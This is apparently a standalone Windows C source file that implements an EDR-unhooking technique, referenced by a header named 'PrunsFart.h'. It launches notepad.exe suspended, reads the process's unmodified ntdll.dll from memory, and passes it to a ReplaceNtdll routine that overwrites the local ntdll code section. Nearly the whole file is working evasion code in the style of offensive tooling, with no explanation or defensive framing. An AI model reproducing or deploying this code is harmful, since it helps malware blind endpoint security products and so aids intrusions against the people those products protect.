#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <psapi.h>

#include "PrunsFart.h"

#define PROCESS "notepad.exe"


BOOL CreateSuspendedProcess(PVOID pNtdll, DWORD NtdllSize, LPVOID* Ntdll) {

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof si);
    ZeroMemory(&pi, sizeof pi);


    if (!CreateProcessA(
        "C:\\Windows\\System32\\"PROCESS,
        NULL,
        NULL,
        NULL,
        TRUE,
        CREATE_SUSPENDED,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[-] [FAILED] CreateProcessA : %d \n", GetLastError());
        return FALSE;
    }
    printf("[+] Process Created Successfully With Pid : %d \n", pi.dwProcessId);


    LPVOID buffer = HeapAlloc(GetProcessHeap(), 0, NtdllSize);
    if (buffer == 0) {
        printf("[-] [FAILED] HeapAlloc : %d \n", GetLastError());
        return FALSE;
    }

    if (buffer != 0 && !ReadProcessMemory(pi.hProcess, (LPCVOID)pNtdll, buffer, NtdllSize, NULL)) {
        printf("[-] [FAILED] ReadProcessMemory : %d \n", GetLastError());
        return FALSE;
    }

    printf("[+] Ntdll Is Read To : 0x%p \n", (PVOID)buffer);
    *Ntdll = buffer;

    CloseHandle(pi.hThread);
    TerminateProcess(pi.hProcess, 0);

    if (*Ntdll == NULL)
        return FALSE;

    return TRUE;
}



int main(){

    LPVOID RemoteNtdll = NULL;
    
    PVOID pLocalNtdll = GetDll(TEXT("ntdll.dll"));
    if (pLocalNtdll == NULL)
    {
        return FALSE;
    }

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pLocalNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((ULONG_PTR)pLocalNtdll + pDosHeader->e_lfanew);
    PIMAGE_OPTIONAL_HEADER pOptionalHeader = (PIMAGE_OPTIONAL_HEADER)&pNtHeaders->OptionalHeader;
    PIMAGE_SECTION_HEADER TxtSextion = IMAGE_FIRST_SECTION(pNtHeaders);
    DWORD NtdllSize = pOptionalHeader->SizeOfImage;

    if (!CreateSuspendedProcess(pLocalNtdll, NtdllSize, &RemoteNtdll)) {
        return -1;
    }
	
    ReplaceNtdll(pLocalNtdll, RemoteNtdll, TxtSextion);
	
    
    printf("[i] Hit Enter To Exit ...");
    getchar();
    return 0;


}

